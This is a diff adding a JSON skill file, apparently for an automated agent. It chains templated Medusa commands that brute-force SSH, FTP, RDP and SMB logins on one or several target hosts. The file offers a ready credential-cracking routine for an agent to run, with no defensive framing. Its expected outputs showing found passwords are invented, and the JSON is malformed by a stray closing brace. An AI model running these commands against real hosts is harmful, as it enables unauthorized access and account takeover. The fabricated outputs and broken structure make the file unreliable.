@@ -1,0 +1,30 @@
+{
+  "name": "medusa_parallel_bruteforce",
+  "description": "Parallel network login bruteforce using Medusa (alternative to Hydra)",
+  "pattern": "medusa.*brute|parallel.*login|medusa.*attack|network.*parallel",
+  "parameters": ["service", "target", "userlist", "passlist"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "medusa", "args": ["-h", "{{target}}", "-U", "{{userlist}}", "-P", "{{passlist}}", "-M", "{{service}}", "-t", "4"]},
+      "expected_output": {"type": "string", "example": "Medusa v2.2 parallel login bruteforcer\nACCOUNT FOUND: [{{service}}] Host: {{target}} User: admin Password: admin123\nACCOUNT FOUND: [{{service}}] Host: {{target}} User: root Password: toor\nACCOUNT CHECK: [{{service}}] Host: {{target}} (1000 of 10000 complete)\n2 valid credentials found"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "medusa", "args": ["-h", "{{target}}", "-u", "admin", "-P", "{{passlist}}", "-M", "ssh", "-f"]},
+      "expected_output": {"type": "string", "example": "Single user brute (admin) with -f (exit on first found)\nACCOUNT FOUND: [ssh] Host: {{target}} User: admin Password: password123\nStopped after first valid credential"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "medusa -h {{target}} -U {{userlist}} -P {{passlist}} -M {{service}} -O medusa_output.txt"]},
+      "expected_output": {"type": "string", "example": "Results logging to medusa_output.txt\n5 accounts tested\n3 passwords found\nOutput file created with timestamp"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "medusa", "args": ["-H", "targets.txt", "-U", "{{userlist}}", "-P", "{{passlist}}", "-M", "{{service}}"]},
+      "expected_output": {"type": "string", "example": "Multi-target attack from targets.txt\nHost 192.168.1.100: 2 accounts found\nHost 192.168.1.101: 1 account found\nHost 192.168.1.102: 0 accounts found\nTotal: 3 credentials across 3 hosts"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "medusa -d | grep -E 'ssh|ftp|rdp|smb'"]},
+      "expected_output": {"type": "string", "example": "Available modules:\n + ssh.mod : Brute force module for SSH v2\n + ftp.mod : Brute force module for FTP/FTPS\n + rdp.mod : Brute force module for RDP\n + smb.mod : Brute force module for SMB"}}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
